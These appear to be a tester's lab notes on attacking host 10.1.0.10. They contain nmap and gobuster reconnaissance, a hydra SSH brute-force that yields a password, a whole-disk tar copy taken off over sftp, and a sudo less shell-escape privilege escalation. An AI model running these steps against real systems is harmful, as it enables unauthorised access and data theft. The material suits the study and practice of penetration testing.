# NMAP Scan

```sh
nmap -A -p 0-65535 10.1.0.10
```

```sh
Starting Nmap 7.92 ( https://nmap.org/ ) at 2022-02-22 09:00 EST
Nmap scan report for 10.1.0.10
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 e9:b7:ab:3a:b8:68:5e:cc:85:f6:00:b3:99:b9:22:ae (RSA)
|   256 b4:7c:1f:96:22:5a:63:4d:2b:30:db:5f:ef:70:11:bd (ECDSA)
|_  256 9d:40:34:55:05:70:80:b0:d0:ce:d0:d5:f4:5d:cd:28 (ED25519)
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
20321/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.43 seconds
```

open apache on web
default page (nicht konfigurierter server)
# GoBuster
```sh
gobuster dir -u 10.1.0.10:80 -w /wordlists/dirbig.txt
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.0.10:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/tomsparrow/Documents/wordlists/dirbig.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/02 15:39:40 Starting gobuster in directory enumeration mode
===============================================================
//                    (Status: 200) [Size: 10701]
/home                 (Status: 301) [Size: 305] [--> http://10.1.0.10/home/]

===============================================================
2022/03/02 15:39:48 Finished
===============================================================
```


/home reveals potential users
Apache/2.4.51 (Debian) Server

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44790

https://www.zerodayinitiative.com/blog/2022/1/25/cve-2021-44790-code-execution-on-apache-via-an-integer-underflow

per user

```sh
gobuster dir -u 10.1.0.10/home -w /Users/tomsparrow/Documents/wordlists/file+dir.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.0.10/home
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/tomsparrow/Documents/wordlists/file+dir.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/02 15:59:32 Starting gobuster in directory enumeration mode
===============================================================
/root                 (Status: 301) [Size: 310] [--> http://10.1.0.10/home/root/]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswds           (Status: 403) [Size: 274]
Progress: 36171 / 45522 (79.46%)                                                 274]

===============================================================
2022/03/02 16:02:36 Finished
===============================================================
```
# John the Ripper
try bruteforce attack on ssh with users. using rockyou.txt


```sh
hydra -l root -P rockyou.txt -t 4 10.1.0.10 ssh
```

root no pw found
bingo no pw found
bluey found pw phoenix

# Backup

tar -cvpzf ./backup.tar.gz --exclude=./backup.tar.gz /
transfer with sftp

# Vulnerabilities
https://security-tracker.debian.org/tracker/CVE-2021-31440

https://security-tracker.debian.org/tracker/CVE-2021-33909

https://security-tracker.debian.org/tracker/CVE-2020-25221

https://security-tracker.debian.org/tracker/CVE-2021-26708

https://security-tracker.debian.org/tracker/CVE-2021-20292

https://security-tracker.debian.org/tracker/CVE-2019-15239

https://security-tracker.debian.org/tracker/CVE-2019-3896

https://security-tracker.debian.org/tracker/CVE-2021-33200

# sudo less Exploit
sudoers
bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log

sudo /usr/bin/less /var/log/auth.log

in less !/bib/sh

https://www.computersecuritystudent.com/UNIX/SUDO/lesson2/index.html

https://www.cybersecurity-help.cz/vdb/openssh/openssh/8.4p1/
